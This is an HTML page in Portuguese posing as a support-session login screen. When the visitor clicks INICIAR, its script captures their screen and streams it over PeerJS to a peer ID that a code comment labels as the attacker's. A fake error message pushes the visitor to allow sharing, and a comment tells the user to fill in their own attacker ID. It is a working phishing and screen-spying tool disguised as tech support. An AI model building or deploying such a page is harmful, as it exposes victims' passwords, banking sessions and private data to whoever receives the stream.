<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Início de Sessão</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Bem-vindo ao Sistema</h1>
    <p>Clique abaixo para iniciar a conferência de suporte:</p>
    <button id="iniciar">INICIAR</button>
    <p id="status"></p>

    <script>
        // Substitua 'ID_DO_ATACANTE_AQUI' por um nome único, ex: 'projeto-seguranca-2024'
        const DESTINO_ID = 'seu-nome-unico-de-acesso'; 
        const peer = new Peer(); 

        document.getElementById('iniciar').addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                document.getElementById('status').innerText = "Conectando ao suporte...";
                
                // Faz a "ligação" enviando o vídeo da tela
                const call = peer.call(DESTINO_ID, stream);
                
                document.getElementById('status').innerText = "Transmitindo...";
            } catch (err) {
                alert("Erro: Para continuar, você precisa permitir o compartilhamento.");
            }
        });
    </script>
</body>
</html>
